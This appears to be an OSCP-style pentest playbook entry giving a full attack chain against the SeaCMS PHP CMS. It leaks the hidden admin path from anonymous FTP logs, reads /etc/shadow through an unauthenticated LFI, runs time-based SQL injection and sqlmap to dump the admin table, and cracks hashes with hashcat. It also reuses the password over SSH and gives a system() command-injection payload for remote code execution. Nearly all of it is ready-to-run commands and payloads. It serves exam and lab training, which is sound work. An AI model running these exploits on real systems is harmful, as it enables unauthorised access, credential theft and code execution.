title: SeaCMS — Fingerprint, Hidden Admin, SQLi, RCE
body:
SeaCMS (海洋CMS) is a Chinese PHP CMS. Fingerprint it by the SQL dumps in /install/ (seacms.sql, seacmsdata.sql), the gbook.php/member.php/login.php structure, and the install/install_lock.txt presence. The admin panel is in a randomised directory (e.g. /th4o4p/) — this slug is NOT findable by wordlist; it leaks through FTP logs, error logs in /data/, or the config files. Once you have the slug, the admin_pay.php endpoint is SQLi-vulnerable and admin_ip.php is RCE if you're authenticated.

The intended OSCP-safe chain: FTP anonymous → logs contain the slug → SQLi on admin_pay.php → dump sea_admin table → decode credentials (base64 or MD5) → SSH. sqlmap is out of scope on OSCP — use manual time-based SQLi or the sqli_time node.
cmd:
# ══════════════════════════════════════════════════
# 1 — FINGERPRINT SeaCMS
# ══════════════════════════════════════════════════
# These files are unique to SeaCMS:
curl -s http://<IP>/install/seacms.sql | head -5
curl -s http://<IP>/install/seacmsdata.sql | head -5
curl -s http://<IP>/install/install_lock.txt
# Also: gbook.php, member.php, database.php at root

# ══════════════════════════════════════════════════
# 2 — FIND THE RANDOMISED ADMIN SLUG
# ══════════════════════════════════════════════════
# Method A — FTP logs (fastest — get all logs):
ftp <IP>
# anonymous / anonymous
ftp> mget *.log
ftp> bye
grep -hriE 'admin_|th[0-9a-z]{4,}|/[a-z0-9]{5,8}/admin' *.log | head -20
# Look for paths like: /th4o4p/admin_pay.php, /5f9js3/admin_ip.php

# Method B — /data/ directory listing (if enabled):
curl -s http://<IP>/data/ | grep -i admin

# Method C — error logs in /data/:
curl -s http://<IP>/data/cron.cache.php
for f in config.user.inc config.cache.inc common.inc; do
  curl -s http://<IP>/data/$f.php
done

# ══════════════════════════════════════════════════
# 3 — VERIFY THE SLUG (confirm admin files exist)
# ══════════════════════════════════════════════════
curl -s -o /dev/null -w "%{http_code}\n" http://<IP>/<SLUG>/admin_pay.php
curl -s -o /dev/null -w "%{http_code}\n" http://<IP>/<SLUG>/admin_ip.php
curl -s -o /dev/null -w "%{http_code}\n" http://<IP>/<SLUG>/database.php
# 200 = confirmed. 404 = wrong slug.

# ══════════════════════════════════════════════════
# 4 — LFI via admin_safe.php (no auth needed)
# ══════════════════════════════════════════════════
# Read arbitrary files as the web user:
curl -s "http://<IP>/<SLUG>/admin_safe.php?action=download&file=../../../../../../etc/passwd"
curl -s "http://<IP>/<SLUG>/admin_safe.php?action=download&file=../data/config.user.inc.php"
curl -s "http://<IP>/<SLUG>/admin_safe.php?action=download&file=../../../../../../etc/shadow"

# ══════════════════════════════════════════════════
# 5 — SQLi on admin_pay.php (id parameter)
# ══════════════════════════════════════════════════
# Confirm injection (time-based — page should take 5+ seconds):
curl -s -o /dev/null -w "%{time_total}\n" \
  "http://<IP>/<SLUG>/admin_pay.php?action=del&id=1' AND SLEEP(5)-- -"

# Manual extraction — get admin table (see sqli_time node for full technique):
# Table: seacms.sea_admin  Columns: id,name,password,groupid
# Extract name of row 1:
curl -s "http://<IP>/<SLUG>/admin_pay.php?action=del&id=1' AND (SELECT SLEEP(5) FROM sea_admin WHERE id=1 AND SUBSTRING(name,1,1)='a')-- -"

# Or use sqlmap (NOT on OSCP exam):
sqlmap -u "http://<IP>/<SLUG>/admin_pay.php?action=del&id=1" \
  -p id --batch -D seacms -T sea_admin --dump --technique=T --time-sec=2

# ══════════════════════════════════════════════════
# 6 — DECODE THE PASSWORD
# ══════════════════════════════════════════════════
# SeaCMS stores passwords as base64 OR MD5:
# Base64 (ends with ==): decode directly:
echo 'WW91cmVHb25uYU1ha2VJdDg0Ng==' | base64 -d

# MD5 (32 hex chars): crack with hashcat or online:
hashcat -m 0 e10da9e6a47cbaa2f663 /usr/share/wordlists/rockyou.txt
# or: https://crackstation.net

# ══════════════════════════════════════════════════
# 7 — USE THE CREDENTIALS
# ══════════════════════════════════════════════════
# Try SSH first — often the same password:
ssh <user>@<IP>

# Or log into the admin panel:
# http://<IP>/<SLUG>/  → admin_ip.php for RCE (authenticated)
# Payload in ip field: ";system('id');//
warn: sqlmap is OUT OF SCOPE on OSCP. Use manual time-based SQLi (see sqli_time node) or the LFI via admin_safe.php which requires no auth at all. The randomised admin slug is never in any wordlist — it always leaks through a log file, error message, or config exposure. If you can't find it via FTP, check the /data/ directory listing and all files under /install/. The login.php has a CAPTCHA — the admin panel login typically does not.

choices.label: LFI working — hunt for more creds/keys
